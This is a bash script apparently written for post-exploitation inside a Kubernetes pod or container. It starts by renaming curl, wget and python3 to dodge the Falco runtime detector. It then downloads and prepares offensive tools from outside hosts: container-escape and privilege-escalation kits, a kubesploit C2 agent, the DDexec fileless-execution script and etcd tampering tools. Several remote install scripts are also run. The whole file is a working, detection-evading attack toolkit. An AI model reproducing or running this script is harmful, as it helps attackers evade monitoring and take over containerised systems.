#Simple Bypass Falco
BYPASS_FALCO=0 #true
LOCAL_RUN=0 #true
ROOT_USER=0 #true

WGET="wget"
CURL="curl"
PYTHON3="python3"

NO_CURL=1 #false
NO_WGET=1 #false
NO_PYTHON3=1 #false

output() {
    msg="$1"

    if [ $LOCAL_RUN ]; then
        echo -e $msg
    fi
}

download() {
    url="$1"
    platform="$2"
    bin="$url"

    if [ $NO_CURL -eq 0 ]; then
        if [ ! -z "$platform" ]; then
            bin=$($WGET -q -O- $url | grep $platform | head -n 1 | cut -d : -f 2,3 | tr -d \")
        fi
        $WGET -q $bin
    else
        if [ ! -z "$platform" ]; then
            bin=$($CURL -s $url | grep $platform | head -n 1|  cut -d : -f 2,3 | tr -d \")
        fi
        $CURL -s $bin
    fi
    echo $(basename "$bin")
}

root_check=$(id | grep root)
if [ -z "$root_check" ]; then
    output "Running as not root. Some tools may fail to install"
    ROOT_USER=1
fi

if ! command -v curl &> /dev/null; then
    NO_CURL=0
fi

if ! command -v wget &> /dev/null; then
    NO_WGET=0
fi

if ! command -v python3 &> /dev/null; then
    NO_PYTHON3=0
fi

if [ $NO_CURL -eq 0 ] && [ $NO_WGET -eq 0 ]; then
    output "curl and wget not found, impossible to continue"
    exit 1
fi

if [ $BYPASS_FALCO ]; then
    if ! [ $NO_CURL ]; then
        if [ `mv /usr/bin/curl /usr/bin/kurl` -eq 0 ]; then
            CURL="kurl"
        fi
    fi

    if ! [ $NO_WGET ]; then
        if [ `mv /usr/bin/wget /usr/bin/vget` -eq 0 ]; then
            WGET="vget"
        fi
    fi

    if ! [ $NO_PYTHON3 ]; then
        if [ `mv /usr/bin/python3 /usr/bin/pton3` -eq 0 ]; then
            PYTHON3="pton2"
        fi
    fi
fi

# Install botb
output "Downloading botb..."
downloaded_file=$(download https://api.github.com/repos/brompwnie/botb/releases/latest "browser_download_url.*linux-amd64")
mv $downloaded_file botb
chmod +x botb

# Install traitor
output "Downloading traitor..."
downloaded_file=$(download https://api.github.com/repos/liamg/traitor/releases/latest "browser_download_url.*-amd64")
mv $downloaded_file traitor
chmod +x traitor

# Install kubeletctl
output "Downloading kubelectctl..."
downloaded_file=$(download https://api.github.com/repos/cyberark/kubeletctl/releases/latest "browser_download_url.*_linux_amd64")
mv $downloaded_file kubeletctl
chmod +x kubeletctl

# Install kubesploit C2 agent
output "Downloading kubesploit..."
downloaded_file=$(download https://api.github.com/repos/cyberark/kubesploit/releases/latest "browser_download_url.*-Linux-x64")
7z x $downloaded_file -r kubesploit -pkubesploit
chmod +x kubesploit
rm -rf $downloaded_file

# Install CDK
output "Downloading cdk..."
downloaded_file=$(download https://api.github.com/repos/cdk-team/CDK/releases/latest "browser_download_url.*_linux_amd64")
mv $downloaded_file cdk
chmod +x cdk

# Install peirates
output "Downloading peirates..."
downloaded_file=$(download https://api.github.com/repos/inguardians/peirates/releases/latest "browser_download_url.*-linux-amd64")
tar -xJf $downloaded_file
mv peirates-linux-amd64/peirates peirates
chmod +x peirates
rm -rf $downloaded_file
rm -rf peirates-linux-amd64/

# Install ctrsploit
output "Downloading ctrsploit..."
downloaded_file=$(download https://api.github.com/repos/ctrsploit/ctrsploit/releases/latest "browser_download_url.*_linux_amd64")
mv $downloaded_file ctrsploit
chmod +x ctrsploit

# Install kdigger
output "Downloading kdigger..."
downloaded_file=$(download https://api.github.com/repos/quarkslab/kdigger/releases/latest "browser_download_url.*-linux-amd64")
mv $downloaded_file kdigger
chmod +x kdigger

# Install kubectl
output "Downloading kubectl (as k)..."
downloaded_file=$(download https://storage.googleapis.com/kubernetes-release/release/stable.txt)
new_url="https://storage.googleapis.com/kubernetes-release/release/`cat $downloaded_file`/bin/linux/amd64/kubectl"
rm -rf $downloaded_file
downloaded_file=$(download $new_url)
mv $downloaded_file k
chmod +x k

#Install amicontained
output "Downloading amicontained..."
downloaded_file=$(download https://api.github.com/repos/genuinetools/amicontained/releases/latest "browser_download_url.*-linux-amd64")
mv $downloaded_file amicontained
chmod +x amicontained

#Install linuxprivchecker
output "Downloading linuxprivichecker..."
downloaded_file=$(download https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py)

#Install unix-privesc-checker
output "Downloading unix-privesc-checker..."
downloaded_file=$(download http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz)
tar -xzf $downloaded_file
mv unix-privesc-check*/unix-privesc-check unixprivesc-check
rm -rf unix-privesc-check*

#Install deepce
output "Downloading deepce..."
downloaded_file=$(download https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh)
sed -i "s/wget/$WGET/g" $downloaded_file
sed -i "s/curl/$CURL/g" $downloaded_file
sed -i "s/python3/$PYTHON3/g" $downloaded_file
chmod +x $downloaded_file

#Install helm
output "Downloading helm..."
downloaded_file=$(download https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3)
mv $downloaded_file get_helm.sh
sed -i "s/wget/$WGET/g" get_helm.sh
sed -i "s/curl/$CURL/g" get_helm.sh
chmod 700 get_helm.sh
./get_helm.sh
rm ./get_helm.sh

#Install kube-hunter
output "Downloading kube-hunter..."
downloaded_file=$(download https://api.github.com/repos/aquasecurity/kube-hunter/releases/latest "browser_download_url.*-linux-x86")
mv $downloaded_file kube-hunter
chmod +x kube-hunter

#Install kubescape
output "Downloading kubescape..."
downloaded_file=$(download https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh)
sed -i "s/curl/$CURL/g" $downloaded_file
chmod 700 $downloaded_file
sh $downloaded_file

#Install kube-bench
output "Downloading kube-bench..."
downloaded_file=$(download https://api.github.com/repos/aquasecurity/kube-bench/releases/latest "browser_download_url.*_linux_amd64.deb")
dpkg -i $downloaded_file
rm -f kube-bench.deb

#Install etcdctl
output "Downloading etcdctl..."
downloaded_file=$(download https://api.github.com/repos/etcd-io/etcd/releases/latest "browser_download_url.*-linux-amd64")
mkdir -p etcd_latest
tar -xzf $downloaded_file -C etcd_latest --strip-components=1
mv etcd_latest/etcdctl etcdctl
chmod +x etcdctl
rm -rf etcd_latest
rm -rf $downloaded_file

#Install DDexec
output "Downloading ddexec..."
downloaded_file=$(download https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh)
chmod +x ddexec.sh

# Install kubetcd
output "Downloading kubetcd..."
downloaded_file=$(download https://api.github.com/repos/nccgroup/kubetcd/releases/latest "browser_download_url.*_linux_amd64")
mv $downloaded_file kubetcd
chmod +x kubetcd